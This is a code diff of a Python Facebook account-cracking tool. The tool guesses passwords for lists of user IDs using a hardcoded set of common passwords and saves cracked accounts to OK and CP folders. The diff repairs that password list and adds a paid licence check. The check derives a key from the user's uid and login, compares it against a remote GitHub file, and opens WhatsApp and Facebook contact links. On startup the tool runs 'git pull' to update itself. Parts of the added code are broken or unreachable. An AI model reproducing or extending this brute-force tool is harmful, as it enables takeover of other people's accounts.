@@ -219,7 +219,7 @@ def i():
         jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025]
+            pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025']
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
@@ -283,5 +283,105 @@ def rcrack(uid,pwx,tl):
         sys.stdout.flush()
     except:
         pass
+  
+def menu_apikey():  
+  uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
+  id = "ꙶꙶꙶͯͯᷓͮͭͦͧͨᷓᷓ".join(uuid)
+  ak="2ꙶꙶꙶꙶꙶꙶꙶͯͯᷓͮͭͦͧͨͯͯᷓͮͭͦͧͨᷓ7ꙶꙶꙶꙶꙶ" 
+  server = requests.get('https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt').text
+  
+ 
+
+  os.system(" clear")                          
+  print("""\033[1;37m
+  ██████╗ ███████╗    ██████╗     ██╗  ██╗
+██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
+██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
+██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
+╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
+ ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
+\033[1;92m╔═════════════════════════════════════════╗
+\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
+\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
+\033[1;92m║ ᗙ  Version  : 1.0                       ║
+\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
+\033[1;92m╚═════════════════════════════════════════╝""")
+  print("\033[1;37m--------------------------------------------------")
+  print("\x1b[1;92m THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
+  print("\033[1;37m--------------------------------------------------")
+  print("")
+  print("\033[1;37m ╔═══════════════════════════════════════════════╗ ")
+  print("\x1b[1;92m       YOUR  KEY : "+ak+id)
+  print("\033[1;37m ╚═══════════════════════════════════════════════╝ ")
+  print("")
+  print("\033[1;37m--------------------------------------------------")
+  print("\033[1;37m-------> CONTACT ADMIN TO BUY THIS TOOLS <--------   ");
+  print("\033[1;37m--------------------------------------------------")
+  print("")
+  print("  SEND KEY ON ADMIN WHATSAPP,,,,,, ");
+  os.system('xdg-open https://wa.me/+8801836751224')
+  print("");
+  print("\x1b[1;97m  CHECKING YOUR APROVAL....                                             ");
+  print("")
+  try:
+    httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
+    if id in httpCaht:
+      print("\033[1;97m   YOUR KEY APROVED ");
+      msg = str(os.geteuid()) 
+      pass
+    else:
+      os.system('xdg-open https://www.facebook.com/gsriyad11')
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__': 
+    	print(logo)
+    	menu_apikey()
+menu_apikey() 
+def tnx():
+  uuid = str(os.geteuid())
+  id = "–".join(uuid)
+  server = requests.get('https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt').text
+  os.system(" clear ")
+  print(logo)
+  print(" Wait bro,,,, ")
+  print(" Chacking Your Aproval ")
+  print("\x1b[1;97m  CHECKING YOUR APROVAL.....                                          ");
+  try:
+    httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
+    if id in httpCaht:
+      print("\033[1;97m   YOUR KEY APROVED ");
+      msg = str(os.geteuid()) 
+      pass
+    else:
+      os.system('xdg-open https://wa.me/+8801836751224')
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__': 
+    	print(logo)
+    	menu_apikey()
+try:
+	menu()
+except requests.exceptions.ConnectionError:
+	print('\n No internet connection ...')
+	exit()
+except:exit()
+clear()
+os.system(" clear ")
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
+if __name__=='__main__':
+    try:os.system('git pull')
+    except:pass
+    try:os.mkdir('OK')
+    except:pass
+    try:os.mkdir('CP')
+    except:pass
+    try:os.mkdir('DUMP')
+    except:pass
+    try:os.system('touch .prox.txt')
+    except:pass
+    #approval()
+    menu()
 
 Riyad()
